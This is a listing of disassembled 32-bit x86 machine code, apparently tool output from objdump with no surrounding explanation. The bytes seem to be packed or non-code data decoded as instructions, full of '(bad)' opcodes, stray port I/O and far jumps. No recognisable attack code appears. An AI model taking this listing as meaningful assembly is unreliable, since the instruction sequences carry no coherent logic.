  428f60:	(bad)  
  428f61:	gs push cs
  428f63:	aad    0xd4
  428f65:	dec    ecx
  428f66:	out    dx,al
  428f67:	pop    eax
  428f68:	rol    DWORD PTR [ebx],0x3f
  428f6b:	in     eax,dx
  428f6c:	xor    BYTE PTR [edx-0x1f],bh
  428f6f:	std    
  428f70:	dec    esi
  428f71:	push   eax
  428f72:	or     al,0xcd
  428f74:	enter  0xc66d,0x61
  428f78:	dec    edi
  428f79:	mov    ch,0xe
  428f7b:	pop    eax
  428f7c:	scas   eax,DWORD PTR es:[edi]
  428f7d:	pop    edi
  428f7e:	jns    0x428fdb
  428f80:	inc    ebx
  428f81:	mov    edx,0x8fda5520
  428f86:	add    DWORD PTR [ecx],eax
  428f88:	mov    ebx,0x5515ea03
  428f8d:	ficomp DWORD PTR [edx-0xd]
  428f90:	jle    0x428f2f
  428f92:	ins    BYTE PTR es:[edi],dx
  428f93:	mov    al,0xb8
  428f95:	push   0xffffffd9
  428f97:	xchg   esp,eax
  428f98:	retf   
  428f99:	imul   edi,DWORD PTR [eax+0x7790ef6c],0x2fccbe8e
  428fa3:	sub    DWORD PTR [ebx],ebx
  428fa5:	mov    ch,0x4f
  428fa7:	cmp    DWORD PTR [eax-0x76],esi
  428faa:	push   esp
  428fab:	push   ebp
  428fac:	inc    edi
  428fad:	sbb    esp,eax
  428faf:	or     ah,BYTE PTR [esi+0x4f9301d2]
  428fb5:	gs mov ch,0x50
  428fb8:	(bad)  
  428fb9:	gs mov al,0x96
  428fbc:	mov    cl,0x22
  428fbe:	fs cmp al,cl
  428fc1:	sub    eax,0xe99889a5
  428fc6:	lods   al,BYTE PTR ds:[esi]
  428fc7:	sub    eax,0x9bf5136a
  428fcc:	fisub  DWORD PTR [edi-0x568aeb1d]
  428fd2:	bnd js 0x429034
  428fd5:	(bad)  
  428fd6:	dec    BYTE PTR [eax+0x77]
  428fd9:	call   0x271:0xec072336
  428fe0:	pop    ds
  428fe1:	xor    DWORD PTR [esi+0x36],edi
  428fe4:	aad    0x1
  428fe6:	cmp    ebp,DWORD PTR [edi-0x183be540]
  428fec:	jecxz  0x429021
  428fee:	jmp    0x42906f
  428ff0:	xor    eax,0xfb61dc55
  428ff5:	cli    
  428ff6:	rcr    DWORD PTR [edi],0x50
  428ff9:	aam    0x85
  428ffb:	adc    eax,0x9ca95b59
  429000:	jbe    0x428fe3
  429002:	inc    edi
  429003:	test   BYTE PTR [esi+ebp*8-0xf64876a],0x5d
  42900b:	inc    ebx
  42900c:	inc    ecx
  42900d:	inc    eax
  42900e:	push   0x29
  429010:	sub    al,BYTE PTR [eax]
	...
  429072:	add    BYTE PTR [eax],al
  429074:	loope  0x429062
  429076:	mov    ebx,es
  429078:	(bad)  
  429079:	jecxz  0x42906a
  42907b:	out    dx,al
  42907c:	mov    edi,0x27fc7b77
  429081:	fiadd  WORD PTR [ecx]
  429083:	mov    ebp,0x1b741
  429088:	add    eax,0x12000001
  42908d:	jle    0x4290e5
  42908f:	mov    bh,0xd
  429091:	push   ds
  429092:	adc    DWORD PTR [ebp+0xca595f3],0x818401fd
  42909c:	sbb    DWORD PTR [ebp+ebp*4+0x6a86c950],ebx
  4290a3:	lahf   
  4290a4:	pop    es
  4290a5:	fimul  WORD PTR [edi+0x1a7b695a]
  4290ab:	repz mov al,ds:0xe8da04f7
  4290b1:	in     al,0xaf
  4290b3:	retf   
  4290b4:	shl    cl,cl
  4290b6:	pop    ebp
  4290b7:	das    
  4290b8:	jbe    0x429052
  4290ba:	pop    es
  4290bb:	icebp  
  4290bc:	in     eax,0xc8
  4290be:	add    BYTE PTR [ebx-0x61aa082e],bh
  4290c4:	dec    edx
  4290c5:	cmp    al,0x5c
  4290c7:	pop    ecx
  4290c8:	inc    ecx
  4290c9:	leave  
  4290ca:	lahf   
  4290cb:	test   al,0x5a
  4290cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4290ce:	hlt    
  4290cf:	mov    dl,0xad
  4290d1:	jno    0x4290df
  4290d3:	mov    ch,0x92
  4290d5:	xchg   ebp,eax
  4290d6:	cs stos DWORD PTR es:[edi],eax
  4290d8:	icebp  
  4290d9:	mov    WORD PTR [ecx],cs
  4290db:	mov    BYTE PTR [esp+ebp*1+0x5578659],0x7d
  4290e3:	es jle 0x42907d
  4290e6:	mov    ebx,0xef739283
  4290eb:	xor    DWORD PTR [ebx],esi
  4290ed:	xor    edi,DWORD PTR [eax+esi*2]
  4290f0:	ss sbb al,0xbf
  4290f3:	mov    WORD PTR [eax],ss
  4290f5:	ficom  DWORD PTR [esi]
  4290f7:	call   0xbd995625
  4290fc:	mov    bh,0x44
  4290fe:	mov    ch,0x58
  429100:	adc    al,bh
  429102:	sub    al,ch
  429104:	jmp    FWORD PTR [edx-0x31]
  429107:	loop   0x4290db
  429109:	jl     0x4290c7
  42910b:	bound  ecx,QWORD PTR ds:0xf6eec5e9
  429111:	int    0x22
  429113:	cmp    eax,0x62fd955
  429118:	mov    cs,WORD PTR [ebx+0x38781a52]
  42911e:	sbb    eax,0x71dd7348
  429123:	sbb    eax,0x40368147
  429128:	fsub   DWORD PTR [esi-0xc]
  42912b:	push   ecx
  42912c:	jp     0x4290b3
  42912e:	cld    
  42912f:	les    eax,FWORD PTR ds:0x7212c1df
  429135:	or     ch,ah
  429137:	enter  0xbf2f,0x25
  42913b:	cmp    ah,bh
  42913d:	test   al,0x92
  42913f:	adc    BYTE PTR [ebp-0x17a35cbf],dl
  429145:	enter  0xe69a,0x2e
  429149:	sub    eax,0x2c849277
  42914e:	mov    eax,ds:0x43253e4d
  429153:	add    al,0xb7
  429155:	cmp    bl,dh
  429157:	or     al,0xa0
  429159:	mov    dl,0x28
  42915b:	add    bh,BYTE PTR [eax]
  42915d:	adc    ch,BYTE PTR fs:[edi]
  429160:	mov    al,ds:0xf0d31b1e
  429165:	push   ebx
  429166:	jg     0x42910e
  429168:	xor    BYTE PTR [ebx+0x3],dh
  42916b:	test   eax,0x1786f01c
  429170:	pop    es
  429171:	sbb    BYTE PTR [edx+0x20],dh
  429174:	mov    al,0xcb
  429176:	mov    edx,DWORD PTR [eax]
  429178:	popa   
  429179:	inc    edi
  42917a:	add    DWORD PTR [esi+0x61],ebp
  42917d:	adc    eax,ebx
  42917f:	inc    esi
  429180:	cld    
  429181:	xchg   esp,eax
  429182:	call   0xdf40ebd8
  429187:	fwait
  429188:	stc    
  429189:	pop    esp
  42918a:	in     eax,dx
  42918b:	push   ds
  42918c:	fstp   st(0)
  42918e:	aad    0xa5
  429190:	ret    
	...
  4291f1:	add    BYTE PTR [eax],al
  4291f3:	add    BYTE PTR [esi-0x79],dl
  4291f6:	std    
  4291f7:	test   ch,bh
  4291f9:	(bad)  
  4291fa:	jg     0x4291d3
  4291fc:	into   
  4291fd:	retf   
  4291fe:	or     DWORD PTR [ebx+eax*8+0x4631bba6],0x50001b8
  429209:	add    DWORD PTR [eax],eax
  42920b:	add    ch,bl
  42920d:	push   esi
  42920e:	xchg   esp,eax
  42920f:	ins    BYTE PTR es:[edi],dx
  429210:	sbb    BYTE PTR [eax+0x5d],cl
  429213:	adc    eax,0x81c5e3c8
  429218:	push   edi
  429219:	and    ebp,DWORD PTR [edi]
  42921b:	push   edx
  42921c:	rcl    BYTE PTR [edi],0xbc
  42921f:	xor    al,0x92
  429221:	fiadd  WORD PTR [ebx-0x5a008890]
  429227:	(bad)  
  429228:	xor    edx,eax
  42922a:	and    DWORD PTR [esi-0x35],esi
  42922d:	or     bl,0x98
  429230:	fsub   DWORD PTR [ebx]
  429232:	mov    eax,ds:0xbc580a1e
  429237:	sbb    al,0x40
  429239:	jnp    0x42921f
  42923b:	push   edx
  42923c:	ret    0xc8f2
  42923f:	xchg   edx,eax
  429240:	push   ecx
  429241:	out    dx,al
  429242:	add    cl,BYTE PTR [bp+si]
  429245:	repnz push ecx
  429247:	ret    
  429248:	mov    ds:0x5458fcd9,eax
  42924d:	(bad)  
  42924e:	into   
  42924f:	adc    edx,DWORD PTR ds:0xefb084b7
  429255:	push   ss
  429256:	test   DWORD PTR [ebx+0x12d081e9],edi
  42925c:	bound  edi,QWORD PTR [ebp+0x4b]
  42925f:	xchg   edi,eax
  429260:	idiv   BYTE PTR [eax-0x53]
  429263:	retf   
  429264:	and    DWORD PTR [ebx+0x4c],ebx
  429267:	inc    ecx
  429268:	cmc    
  429269:	out    0x6d,eax
  42926b:	stos   BYTE PTR es:[edi],al
  42926c:	add    edi,0x14593089
  429272:	dec    edi
  429273:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  429274:	cmc    
  429275:	or     BYTE PTR [ebx+0x23],0xf1
  429279:	shl    ah,0x6d
  42927c:	and    al,BYTE PTR [ebx+0x2c]
  42927f:	push   ecx
  429280:	(bad)  
  429281:	mul    DWORD PTR [eax-0x7f]
  429284:	test   BYTE PTR [edi-0x43],dh
  429287:	loope  0x429256
  429289:	fisubr DWORD PTR fs:0xa9cadd3e
  429290:	sub    dl,BYTE PTR [edi+0x5beab7c8]
  429296:	out    0x1a,eax
  429298:	(bad)  
  429299:	popa   
  42929a:	jae    0x429237
  42929c:	out    0x96,al
  42929e:	jne    0x42931d
  4292a0:	pop    es
  4292a1:	loop   0x42922b
  4292a3:	ret    
  4292a4:	adc    esp,DWORD PTR [ecx+eax*8-0x2630c87d]
  4292ab:	in     eax,dx
  4292ac:	icebp  
  4292ad:	jmp    0x589a2635
  4292b2:	retf   
  4292b3:	xor    al,0xff
  4292b5:	ror    DWORD PTR [eax+0x1d],cl
  4292b8:	lods   eax,DWORD PTR ds:[esi]
  4292b9:	push   ecx
  4292ba:	mov    al,0x13
  4292bc:	addr16 jle 0x4292b2
  4292bf:	pop    ecx
  4292c0:	jmp    0x429277
  4292c2:	push   eax
  4292c3:	test   eax,0x30dbe58d
  4292c8:	loope  0x429257
  4292ca:	mov    edx,0x1b8cf4a5
  4292cf:	adc    BYTE PTR [eax-0x34],dh
  4292d2:	icebp  
  4292d3:	sahf   
  4292d4:	test   BYTE PTR [esi-0x61],dl
  4292d7:	xchg   ecx,eax
  4292d8:	dec    esp
  4292d9:	inc    ebx
  4292da:	popf   
  4292db:	adc    ch,BYTE PTR [ebx]
  4292dd:	dec    eax
  4292de:	outs   dx,DWORD PTR ds:[esi]
  4292df:	pop    eax
  4292e0:	and    BYTE PTR [edi+ecx*1+0x79],al
  4292e4:	push   esp
  4292e5:	lock addr16 ret 
  4292e8:	push   0xb2a9ec11
  4292ed:	dec    edi
  4292ee:	mov    BYTE PTR [esi+0x59],dh
  4292f1:	inc    esi
  4292f2:	hlt    
  4292f3:	xchg   edx,eax
  4292f4:	xor    ah,ah
  4292f6:	push   ecx
  4292f7:	loop   0x4292a5
  4292f9:	jne    0x429351
  4292fb:	push   es
  4292fc:	mov    al,0x44
  4292fe:	jg     0x42929d
  429300:	ret    
  429301:	cmp    eax,DWORD PTR [ebx+0xd]
  429304:	sbb    ch,BYTE PTR [ebx+0x1f]
  429307:	inc    edi
  429308:	sub    ah,dh
  42930a:	int    0xac
  42930c:	jmp    0x7e786b21
	...
  429371:	add    BYTE PTR [eax],al
  429373:	add    al,dh
  429375:	adc    al,0xe1
  429377:	(bad)  
  429378:	in     eax,0xff
  42937a:	call   FWORD PTR [esi]
  42937c:	jae    0x429383
  42937e:	dec    edx
  42937f:	mov    bh,0x1d
  429381:	ins    DWORD PTR es:[edi],dx
  429382:	lds    ecx,FWORD PTR [edi+0x4b]
  429385:	mov    ecx,0x1050001
  42938a:	add    BYTE PTR [eax],al
  42938c:	cmp    BYTE PTR [esp+esi*4+0x37],0x63
  429391:	adc    BYTE PTR es:[ebx+0x50b6fdf0],dh
  429398:	lods   eax,DWORD PTR ds:[esi]
  429399:	in     eax,0x85
  42939b:	mov    esi,0x4369cb27
  4293a0:	and    al,0x74
  4293a2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4293a3:	je     0x429394
  4293a5:	(bad)  
  4293a6:	jnp    0x429407
  4293a8:	ss fs test al,0x63
  4293ac:	push   edx
  4293ad:	popa   
  4293ae:	sub    bl,BYTE PTR [esi+0x6725d7b5]
  4293b4:	mov    bh,0x58
  4293b6:	or     eax,0xc5a5e4b3
  4293bb:	xor    DWORD PTR [esp+ebp*8+0x2d],ebp
  4293bf:	es dec ebp
  4293c1:	jbe    0x42942d
  4293c3:	(bad)  
  4293c5:	mov    esi,0xbbfe8748
  4293ca:	sub    bl,dh
  4293cc:	sub    bh,bh
  4293ce:	retf   0xb54c
  4293d1:	cwde   
  4293d2:	daa    
  4293d3:	add    al,0x95
  4293d5:	scas   eax,DWORD PTR es:[edi]
  4293d6:	push   ebp
  4293d7:	fdivr  DWORD PTR [si-0x5b83]
  4293dc:	mov    cl,0x23
  4293de:	ret    0xc37a
  4293e1:	(bad)  
  4293e2:	push   ebx
  4293e3:	mov    ah,0x8
  4293e5:	ss cmc 
  4293e7:	dec    ebp
  4293e8:	or     ah,BYTE PTR [edi]
  4293ea:	jmp    FWORD PTR [edi+0x1e00f070]
  4293f0:	push   edx
  4293f1:	retf   
  4293f2:	pop    esi
  4293f3:	mov    al,ds:0x8f76a811
  4293f8:	xor    BYTE PTR [esi+ebp*4],cl
  4293fb:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4293fc:	jl     0x4293d3
  4293fe:	lea    edi,[ecx]
  429400:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  429401:	fisttp WORD PTR [ebp+esi*8+0x32]
  429405:	icebp  
  429406:	fild   DWORD PTR [edx+0x1204045e]
  42940c:	mov    bh,0x2e
  42940e:	stos   DWORD PTR es:[edi],eax
  42940f:	cmp    BYTE PTR [ebx+0xdf8544d],bl
  429415:	cmp    al,0x3c
  429417:	loopne 0x429400
  429419:	mov    ecx,0x17f56567
  42941e:	push   ss
  42941f:	int    0xa7
  429421:	int3   
  429422:	(bad)  
  429423:	enter  0x9299,0x9e
  429427:	jp     0x429403
  429429:	xor    eax,0x6a7add86
  42942e:	push   ebx
  42942f:	jle    0x429438
  429431:	xchg   esp,eax
  429432:	in     al,0xf0
  429434:	sub    ch,ah
  429436:	adc    eax,0xd30b7374
  42943b:	fidivr WORD PTR [ebx]
  42943d:	pop    esi
  42943e:	retf   0xb3a5
  429441:	lds    ecx,FWORD PTR [esi-0x60]
  429444:	and    ah,dl
  429446:	pushf  
  429447:	out    0x91,eax
  429449:	lds    edi,FWORD PTR [edi+ebx*1-0x9]
  42944d:	dec    esi
  42944e:	iret   
  42944f:	cmp    DWORD PTR [eax+0x3014b090],0x7f9aa548
  429459:	and    eax,0xd6cc3e34
  42945e:	lds    esp,FWORD PTR [edi+0xa]
  429461:	cdq    
  429462:	and    eax,0x624436ab
  429467:	pop    edi
  429468:	ins    BYTE PTR es:[edi],dx
  429469:	push   ss
  42946a:	push   0x40
  42946c:	iret   
  42946d:	push   0x7f
  42946f:	jge    0x4294d2
  429471:	adc    BYTE PTR [ebp-0x33629e49],al
  429477:	pop    esp
  429478:	jmp    0x429488
  42947a:	push   0xffffff8e
  42947c:	lea    edi,[edx+0x6d]
  42947f:	pop    edx
  429480:	xchg   esp,eax
  429481:	xchg   edx,eax
  429482:	gs inc esi
  429484:	test   al,0xb4
  429486:	mov    esp,DWORD PTR [edx+0x292f7069]
  42948c:	pop    ss
  42948d:	and    al,0x20
  42948f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429490:	mov    al,BYTE PTR [eax]
	...
  4294f2:	add    BYTE PTR [eax],al
  4294f4:	dec    esp
  4294f5:	or     eax,0x3e532c13
  4294fa:	jg     0x429569
  4294fc:	dec    esp
  4294fd:	arpl   WORD PTR [ebp-0x7344ea16],dx
  429503:	mov    al,ds:0x1ba50
  429508:	add    eax,0xe000001
  42950d:	jecxz  0x42952f
  42950f:	call   0xc5967af2
  429514:	mov    ecx,ebp
  429516:	test   BYTE PTR [ecx+0x67],al
  429519:	adc    dl,dl
  42951b:	cmc    
  42951c:	push   ebp
  42951d:	xchg   edi,eax
  42951e:	out    dx,al
  42951f:	stos   BYTE PTR es:[edi],al
  429520:	adc    bl,BYTE PTR [eax]
  429522:	jmp    0x429569
  429524:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429525:	push   0x17
  429527:	imul   ebp,esp,0x6e
  42952a:	rcr    WORD PTR [eax+0x58],cl
  42952e:	rcr    DWORD PTR [ebp-0x57],0xda
  429532:	push   edx
  429533:	mov    dl,0xe4
  429535:	push   eax
  429536:	es push es
  429538:	push   ds
  429539:	std    
  42953a:	sbb    BYTE PTR [eax-0x6633952a],0xb5
  429541:	inc    esp
  429542:	and    BYTE PTR [eax-0x786b1f10],0x10
  429549:	(bad)  
  42954b:	xchg   edi,eax
  42954c:	and    DWORD PTR ds:0x5f86171b,0xffffffd7
  429553:	mov    BYTE PTR [edx-0x19681355],dh
  429559:	cli    
  42955a:	adc    al,0xc1
  42955c:	push   eax
  42955d:	es stc 
  42955f:	ss and ch,ch
  429562:	mov    eax,ds:0x3c305099
  429567:	pop    esi
  429568:	or     eax,0x1aacf6e8
  42956d:	fnstsw WORD PTR [edx+0x7bfaf910]
  429573:	aaa    
  429574:	adc    BYTE PTR [ecx],0x79
  429577:	mov    cl,0x2c
  429579:	ja     0x4295c4
  42957b:	stos   DWORD PTR es:[edi],eax
  42957c:	je     0x429565
  42957e:	add    DWORD PTR [eax+0x565267e1],esi
  429584:	inc    eax
  429585:	clc    
  429586:	pop    esp
  429587:	out    dx,al
  429588:	pop    edx
  429589:	aaa    
  42958a:	les    ebp,FWORD PTR [esi]
  42958c:	or     al,0xb5
  42958e:	leave  
  42958f:	fld    st(4)
  429591:	xchg   DWORD PTR [ecx-0x131b5945],ecx
  429597:	inc    esp
  429598:	mov    eax,DWORD PTR [ebx+0x54]
  42959b:	popf   
  42959c:	loopne 0x429523
  42959e:	jno    0x4295df
  4295a0:	jmp    0x42959a
  4295a2:	xchg   ebp,eax
  4295a3:	adc    al,0x23
  4295a5:	adc    al,0xea
  4295a7:	dec    esp
  4295a8:	popf   
  4295a9:	ror    BYTE PTR [esi],cl
  4295ab:	or     ch,BYTE PTR [edi+0x699f3047]
  4295b1:	cmp    DWORD PTR [eax+0x3fe5f824],esp
  4295b7:	jp     0x429623
  4295b9:	dec    edx
  4295ba:	adc    edx,esp
  4295bc:	enter  0xc92,0x31
  4295c0:	xor    ebx,DWORD PTR [edx]
  4295c2:	sbb    DWORD PTR [ebx-0x735f5fce],esp
  4295c8:	inc    eax
  4295c9:	sbb    eax,DWORD PTR ds:0x409aa360
  4295cf:	int    0x5b
  4295d1:	stos   BYTE PTR es:[edi],al
  4295d2:	(bad)  
  4295d4:	not    BYTE PTR [eax]
  4295d6:	data16 fwait
  4295d8:	pop    ebp
  4295d9:	mov    edx,0xb6429c8f
  4295de:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4295df:	sub    BYTE PTR [esi+eiz*2],0x8e
  4295e3:	sti    
  4295e4:	in     al,dx
  4295e5:	jg     0x4295e2
  4295e7:	mov    DWORD PTR [edi],ecx
  4295e9:	mov    al,0x8f
  4295eb:	fsubr  DWORD PTR [esi+0x6cf3ed1f]
  4295f1:	outs   dx,BYTE PTR ds:[esi]
  4295f2:	cmp    BYTE PTR [esi-0x76],bl
  4295f5:	loope  0x42958e
  4295f7:	or     ebp,DWORD PTR [edi]
  4295f9:	sub    al,0x7a
  4295fb:	add    ebx,DWORD PTR [eax-0x7926fc85]
  429601:	fimul  DWORD PTR [ebp-0x1231bac3]
  429607:	inc    edi
  429608:	dec    edi
  429609:	call   0xa4a1:0xc57eea51
  429610:	les    eax,FWORD PTR [eax]
	...
  429672:	add    BYTE PTR [eax],al
  429674:	ins    DWORD PTR es:[edi],dx
  429675:	sbb    eax,0xfbf6c0e6
  42967a:	outs   dx,DWORD PTR ds:[esi]
  42967b:	mov    ebp,0xab7b5cea
  429680:	les    esp,FWORD PTR [ebp+ecx*2-0x42]
  429684:	push   ebp
  429685:	mov    ebx,0x1050001
  42968a:	add    BYTE PTR [eax],al
  42968c:	test   al,0x94
  42968e:	stos   DWORD PTR es:[edi],eax
  42968f:	jmp    0x4296e3
  429691:	mov    cl,0xc3
  429693:	or     al,0xab
  429695:	push   ss
  429696:	xor    al,0x2b
  429698:	leave  
  429699:	mov    ebx,0x8b1f01b5
  42969e:	fwait
  42969f:	daa    
  4296a0:	fist   WORD PTR [edx+0x18]
  4296a3:	or     dh,dl
  4296a5:	(bad)
  4296aa:	xchg   ebp,eax
  4296ab:	xchg   ebp,eax
  4296ac:	jo     0x4296dc
  4296ae:	xor    esi,DWORD PTR [edx-0x55bacf6c]
  4296b4:	jmp    0x13de:0x3f4c1001
  4296bb:	shl    esp,0x8a
  4296be:	mov    al,0x14
  4296c0:	dec    edi
  4296c1:	jb     0x429670
  4296c3:	(bad)  [ecx+0x2f]
  4296c6:	jp     0x42966f
  4296c8:	xlat   BYTE PTR ds:[ebx]
  4296c9:	int    0xd6
  4296cb:	lods   eax,DWORD PTR ds:[esi]
  4296cc:	mov    al,ds:0x6db4b27d
  4296d1:	dec    ebp
  4296d2:	mov    esp,DWORD PTR [ebx+0x65453f6a]
  4296d8:	imul   ebp,ecx,0x6a
  4296db:	cwde   
  4296dc:	jg     0x429698
  4296de:	xor    al,0x6f
  4296e0:	sbb    dh,ah
  4296e2:	inc    esi
  4296e3:	cmp    al,0x36
  4296e5:	and    ecx,DWORD PTR [eax-0x328a555c]
  4296eb:	mov    ds:0x62aca5b8,al
  4296f0:	cmp    edx,DWORD PTR [ebp+ebp*8-0x5b799d28]
  4296f7:	or     al,0x9e
  4296f9:	push   ss
  4296fa:	(bad)  [edx-0x21]
  4296fd:	enter  0x4762,0xf8
  429701:	jo     0x42974d
  429703:	daa    
  429704:	ficomp WORD PTR [eax]
  429706:	loop   0x42971f
  429708:	mov    ah,BYTE PTR [edx]
  42970a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42970b:	add    esi,DWORD PTR [ebp+0x291a43e2]
  429711:	xor    DWORD PTR [ebp+0x5],ebp
  429714:	xor    al,0x73
  429716:	aad    0x35
  429718:	sub    ebx,DWORD PTR [ebx+0x19]
  42971b:	xchg   esi,eax
  42971c:	fwait
  42971d:	cmp    eax,0x220ec15d
  429722:	and    BYTE PTR [ecx+edi*1-0x47],dh
  429726:	(bad)  
  429727:	mov    ds:0xb01103af,eax
  42972c:	jmp    0x65a3ade3
  429731:	and    edi,DWORD PTR [eax+0x15]
  429734:	loope  0x429733
  429736:	mov    ebx,0xe60c6851
  42973b:	xchg   esi,eax
  42973c:	xor    eax,0x2986df82
  429741:	aam    0x57
  429743:	dec    eax
  429744:	xor    al,0x5d
  429746:	dec    ebp
  429747:	shr    DWORD PTR [edx-0x2f],0xbb
  42974b:	cwde   
  42974c:	out    0xb6,eax
  42974e:	test   al,0xaa
  429750:	push   ebx
  429751:	jnp    0x429751
  429753:	out    dx,eax
  429754:	dec    ecx
  429755:	inc    esi
  429756:	sub    DWORD PTR [edx],edx
  429758:	jmp    0xc0e:0x61e0fe86
  42975f:	jmp    0x18ec:0x653fb888
  429766:	mov    ebp,0xbfb32fff
  42976b:	add    edi,DWORD PTR [edx+ebx*1-0x36]
  42976f:	dec    ecx
  429770:	dec    edi
  429771:	cwde   
  429772:	push   ebx
  429773:	imul   ebp,esi,0x37
  429776:	jo     0x42978b
  429778:	mov    al,0x8f
  42977a:	ror    BYTE PTR [edi+ebx*1],0xa2
  42977e:	xchg   ebx,edi
  429780:	mov    al,0xe
  429782:	das    
  429783:	or     DWORD PTR [ebx+edx*8-0xe874460],ebp
  42978a:	test   BYTE PTR [ecx-0x66],cl
  42978d:	mov    cl,0xd5
  42978f:	jmp    0x4297a2
	...
  4297f1:	add    BYTE PTR [eax],al
  4297f3:	add    BYTE PTR [eax],dh
  4297f5:	inc    edx
  4297f6:	fbld   TBYTE PTR [edx-0x1]
  4297f9:	(bad)  
  4297fa:	mov    ebp,0x1d164c52
  4297ff:	pop    ebp
  429800:	test   eax,0x5a586683
  429805:	mov    esp,0x1050001
  42980a:	add    BYTE PTR [eax],al
  42980c:	mov    ds:0xb170b2fd,eax
  429811:	cmp    edx,DWORD PTR [esi]
  429813:	call   0xd909:0xdc244169
  42981a:	sub    al,0x86
  42981c:	loope  0x4297b2
  42981e:	jne    0x4297c9
  429820:	mov    bh,0xa0
  429822:	imul   esi,DWORD PTR [ebx+edx*8+0x5c],0xc
  429827:	jbe    0x429829
  429829:	cs dec eax
  42982b:	sub    eax,0x7b01733d
  429830:	push   0x57e2d26d
  429835:	sbb    ch,ah
  429837:	jb     0x42988a
  429839:	push   edi
  42983a:	add    DWORD PTR [esi+0xc],esi
  42983d:	loopne 0x429873
  42983f:	jb     0x429865
  429841:	icebp  
  429842:	(bad)  
  429843:	iret   
  429844:	and    DWORD PTR [esi+0x2d],0xfffffff8
  429848:	push   ecx
  429849:	mov    ebx,0xfa87cb93
  42984e:	push   esp
  42984f:	ss push ecx
  429851:	or     BYTE PTR [ebx+0x3d],dl
  429854:	sub    DWORD PTR [eax+0x46dbfc41],edi
  42985a:	nop
  42985b:	add    BYTE PTR [ecx+ebp*2],cl
  42985e:	outs   dx,DWORD PTR ds:[esi]
  42985f:	lahf   
  429860:	int    0x20
  429862:	test   BYTE PTR [edx],cl
  429864:	(bad)  
  429865:	ins    DWORD PTR es:[edi],dx
  429866:	pop    ebp
  429867:	mov    ebx,0x9a824845
  42986c:	jo     0x4298de
  42986e:	mov    edi,0xa1f51162
  429873:	add    cl,bl
  429875:	mov    cl,0x3
  429877:	sub    BYTE PTR [ecx+edi*1],ch
  42987a:	lods   al,BYTE PTR ds:[esi]
  42987b:	test   DWORD PTR cs:[esi-0x7e],ecx
  42987f:	addr16 dec ecx
  429881:	sbb    al,0x25
  429883:	int3   
  429884:	xor    BYTE PTR [ebp-0x14],0xe6
  429888:	jmp    0x8967bb16
  42988d:	retf   
  42988e:	imul   edi,ecx,0x4d
  429891:	xor    bl,ch
  429893:	mov    ah,0x71
  429895:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  429896:	into   
  429897:	sub    al,BYTE PTR [ebx]
  429899:	xchg   esp,eax
  42989a:	loope  0x4298c9
  42989c:	fnstenv [ebx+0x2e]
  42989f:	or     DWORD PTR ds:0x38f6bb66,ecx
  4298a5:	jno    0x42986e
  4298a7:	in     eax,dx
  4298a8:	pop    edx
  4298a9:	out    dx,eax
  4298aa:	inc    esi
  4298ab:	out    0xad,eax
  4298ad:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4298ae:	mov    ds:0xdacd8191,al
  4298b3:	or     DWORD PTR [eax+0xf601249],edx
  4298b9:	push   ds
  4298ba:	cmp    DWORD PTR [edi],ecx
  4298bc:	mov    dl,0xd2
  4298be:	sbb    DWORD PTR [edi-0x25],ecx
  4298c1:	inc    edi
  4298c2:	(bad)  
  4298c3:	sub    ecx,DWORD PTR [edi-0xf]
  4298c6:	sbb    esp,DWORD PTR [ecx]
  4298c8:	int3   
  4298c9:	inc    edx
  4298ca:	fcmovne st,st(5)
  4298cc:	add    al,0x71
  4298ce:	sub    ecx,DWORD PTR [edi-0x19]
  4298d1:	arpl   WORD PTR [eax+ebp*4+0x39e50f5e],ax
  4298d8:	push   0x54
  4298da:	scas   eax,DWORD PTR es:[edi]
  4298db:	sbb    DWORD PTR [ebx+0x239e3276],edx
  4298e1:	inc    ebx
  4298e2:	mov    ah,BYTE PTR [edi-0x1a]
  4298e5:	mov    ds:0xc3e9122c,eax
  4298ea:	in     eax,dx
  4298eb:	jge    0x4298f1
  4298ed:	mov    DWORD PTR [ebx+0x2291aba],edx
  4298f3:	jno    0x429957
  4298f5:	clc    
  4298f6:	sbb    BYTE PTR [edi],bl
  4298f8:	add    eax,0xf75b88c5
  4298fd:	adc    al,BYTE PTR [eax+0x67d28c7e]
  429903:	shl    BYTE PTR [ebp+0x5d892fac],cl
  429909:	inc    edi
  42990a:	pusha  
  42990b:	cmp    al,0xd0
  42990d:	jne    0x42993d
  42990f:	cmp    al,0xf7
	...
  429971:	add    BYTE PTR [eax],al
  429973:	add    BYTE PTR [edi+0x68],dl
  429976:	fistp  QWORD PTR fs:[edi-0x21]
  42997a:	(bad)  
  42997b:	call   0x3b7e6d73
  429980:	dec    esp
  429981:	jp     0x4299ef
  429983:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  429984:	pop    edi
  429985:	mov    ebp,0x1050001
  42998a:	add    BYTE PTR [eax],al
  42998c:	cld    
  42998d:	lea    esi,[edx*4-0x40b760d0]
  429994:	cmp    ah,BYTE PTR [esi-0x6]
  429997:	xchg   ebx,eax
  429998:	mov    bh,0x90
  42999a:	ja     0x42996b
  42999c:	ja     0x429939
  42999e:	shr    BYTE PTR [ebx+ecx*4],cl
  4299a1:	das    
  4299a2:	xchg   esp,eax
  4299a3:	test   al,0x75
  4299a5:	cdq    
  4299a6:	mov    WORD PTR [ebp+0x3b0f6e2f],gs
  4299ac:	test   eax,0xcacc830b
  4299b1:	adc    bl,BYTE PTR [ecx+0x2f75f5f7]
  4299b7:	fild   QWORD PTR [edi+0x1b]
  4299ba:	xchg   BYTE PTR [ecx],bh
  4299bc:	aam    0xac
  4299be:	jp     0x42995a
  4299c0:	mov    dh,0x67
  4299c2:	aam    0x23
  4299c4:	dec    eax
  4299c5:	push   edi
  4299c6:	xor    BYTE PTR [edi+ecx*8],dh
  4299c9:	shl    BYTE PTR [ebx-0x60],cl
  4299cc:	dec    eax
  4299cd:	hlt    
  4299ce:	in     al,0xee
  4299d0:	in     eax,0xd7
  4299d2:	jg     0x4299af
  4299d4:	jbe    0x429a2a
